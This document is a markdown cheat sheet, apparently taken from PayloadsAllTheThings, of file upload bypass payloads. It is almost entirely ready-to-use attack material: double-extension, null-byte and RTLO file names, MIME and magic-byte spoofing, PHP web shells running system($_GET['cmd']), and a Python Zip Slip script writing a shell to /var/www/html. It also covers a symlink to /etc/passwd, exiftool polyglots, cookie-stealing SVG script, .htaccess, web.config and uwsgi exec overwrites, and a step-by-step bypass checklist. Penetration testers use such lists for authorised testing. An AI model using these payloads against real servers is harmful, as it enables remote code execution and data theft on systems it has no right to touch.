# File Upload Bypass Payloads

> Source: PayloadsAllTheThings — Upload Insecure Files

## Extension Bypass

### PHP Alternatives

```
.php, .php3, .php4, .php5, .php7, .php8
.pht, .phps, .phar, .phpt, .pgif, .phtml, .phtm, .inc
```

### ASP/ASPX Alternatives

```
.asp, .aspx, .ashx, .asmx, .ascx, .config
.cer, .asa, .cdx
```

### JSP Alternatives

```
.jsp, .jspx, .jsw, .jsv, .jspf
```

### Bypass Techniques

```
# Double extension
shell.jpg.php
shell.png.php5

# Reverse double extension (Apache misconfiguration)
shell.php.jpg

# Case variation
shell.pHp
shell.PHP5
shell.PhAr

# Null byte (old systems)
shell.php%00.gif
shell.php\x00.png

# Trailing characters (Windows strips them)
shell.php......
shell.php%20
shell.php%0d%0a.jpg
shell.php/
shell.php.\

# Right-to-Left Override (RTLO)
shell.%E2%80%AEphp.jpg   -> displays as shell.gpj.php

# UTF-8 filename encoding
filename*=UTF8''shell%0a.txt
```

## Content-Type Bypass

Allowed MIME types to use:

```
image/gif
image/png
image/jpeg
image/svg+xml
```

Actual PHP MIME types (blocked):

```
text/php
text/x-php
application/php
application/x-php
application/x-httpd-php
```

## Magic Bytes

Prepend valid file signatures before malicious content:

```
GIF87a  or  GIF89a     -> GIF
\x89PNG\r\n\x1a\n      -> PNG
\xff\xd8\xff            -> JPEG
%PDF-1.5                -> PDF
PK\x03\x04              -> ZIP
```

### Example: GIF + PHP

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

## SVG XSS

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

SVG can also trigger XXE and SSRF (see xxe-payloads.md).

## ZIP Path Traversal (Zip Slip)

Create a ZIP with traversal paths:

```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
```

```bash
# Using ln for symlink attacks
ln -s /etc/passwd symlink.txt
zip --symlinks evil.zip symlink.txt
```

## Polyglot Files

### JPEG + PHP

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' payload.jpg
# Rename to payload.php.jpg or use double extension bypass
```

### PNG + PHP

```bash
# Embed PHP in PNG PLTE chunk
python3 createPNGwithPLTE.py
```

### GIF + PHP

```php
GIF89a<?php system($_GET['cmd']); ?>
```

## Configuration File Overwrite

### .htaccess (Apache)

```apache
AddType application/x-httpd-php .rce
```

Upload as `.htaccess`, then upload `shell.rce`.

### web.config (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

### uwsgi.ini

```ini
[uwsgi]
; execute command on config load
exec = /bin/bash -c 'id > /tmp/pwned'
```

## Upload Detection Bypass Checklist

```
1. Try all alternative extensions for the target language
2. Try double extensions: .php.jpg, .jpg.php
3. Change Content-Type header to image/gif or image/png
4. Prepend magic bytes (GIF89a) to the payload
5. Try null byte injection: .php%00.jpg
6. Upload .htaccess / web.config to reconfigure handlers
7. Try case variation: .pHp, .PhTmL
8. Upload as ZIP/TAR and exploit extraction traversal
9. Embed payload in image metadata (exiftool)
10. Try SVG upload with embedded JavaScript
```
